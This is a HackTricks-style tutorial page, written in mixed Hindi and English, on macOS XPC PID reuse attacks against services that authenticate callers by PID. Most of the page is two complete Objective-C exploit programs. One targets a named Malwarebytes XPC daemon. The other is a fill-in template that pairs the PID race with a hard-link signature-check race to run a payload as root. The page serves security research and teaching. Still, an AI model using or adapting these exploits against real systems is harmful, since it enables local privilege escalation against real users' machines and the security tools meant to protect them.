# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

जब कोई macOS **XPC service** बुलाए गए process की जाँच **audit token** के बजाय **PID** के आधार पर करता है, तो वह PID reuse attack के प्रति vulnerable होता है। यह attack एक **race condition** पर आधारित होता है, जिसमें एक **exploit**, functionality का **abusing** करते हुए **XPC** service को **messages भेजता है और उसके ठीक बाद** **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** को **allowed** binary के साथ execute करता है।<sup>[[1]](#references)[[2]](#references)</sup>

यह function **allowed binary** को PID का owner बना देगा, लेकिन **malicious XPC message** उससे ठीक पहले भेजा जा चुका होगा। इसलिए, यदि **XPC** service sender को **authenticate** करने के लिए **PID** का **use** करती है और **`posix_spawn`** के execution के **AFTER** उसकी जाँच करती है, तो वह समझेगी कि message किसी **authorized** process से आया है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploit example

यदि आपको **`shouldAcceptNewConnection`** function या उसके द्वारा call किया गया कोई function मिलता है, जो **`processIdentifier`** को **call** करता है और **`auditToken`** को call नहीं करता, तो इसकी बहुत अधिक संभावना है कि वह audit token के बजाय process PID को **verify** कर रहा है।\
उदाहरण के लिए, इस image में (जो reference से ली गई है):<sup>[[1]](#references)</sup>

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

इस example exploit को देखें (फिर से, reference से लिया गया है), ताकि exploit के 2 parts देख सकें:<sup>[[1]](#references)</sup>

- एक जो कई forks **generate** करता है
- **Each fork**, message भेजने के तुरंत बाद **`posix_spawn`** execute करते हुए XPC service को **payload भेजेगा**।

> [!CAUTION]
> Exploit के काम करने के लिए ` export`` `` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** करना या इसे exploit के अंदर रखना महत्वपूर्ण है:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
पहला option **`NSTasks`** और children को launch करने के लिए argument का use करता है, ताकि RC exploit किया जा सके.
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
यह उदाहरण **`fork`** का उपयोग करके ऐसे **children को launch करता है जो PID race condition का exploit करेंगे** और फिर Hard link के माध्यम से **एक अन्य race condition का exploit करेंगे:**
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANGE NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successful
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## अन्य उदाहरण

- [**Intego X9: आपके macOS antivirus को PIDs पर भरोसा क्यों नहीं करना चाहिए**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - एक AV के privileged helper के विरुद्ध LPE, जो PID के माध्यम से clients को authenticate करता था।<sup>[[3]](#references)</sup>
- [**macOS में privilege escalation के लिए GOG Galaxy XPC service का Exploitation**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)<sup>[[4]](#references)</sup>
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)<sup>[[5]](#references)</sup>

## References

- [1] [XPC exploitation सीखें - Part 2: PID को न कहें!](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [2] [PID पर भरोसा न करें! एक simple logic bug की कहानियाँ और इसे कहाँ खोजें - Samuel Groß (WarCon 2018)](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [3] [Intego X9: आपके macOS antivirus को PIDs पर भरोसा क्यों नहीं करना चाहिए](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [4] [macOS में privilege escalation के लिए GOG Galaxy XPC service का Exploitation](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [5] [Rootpipe Reborn (Part II)](https://objective-see.org/blog/blog_0x41.html)
{{#include ../../../../../../banners/hacktricks-training.md}}
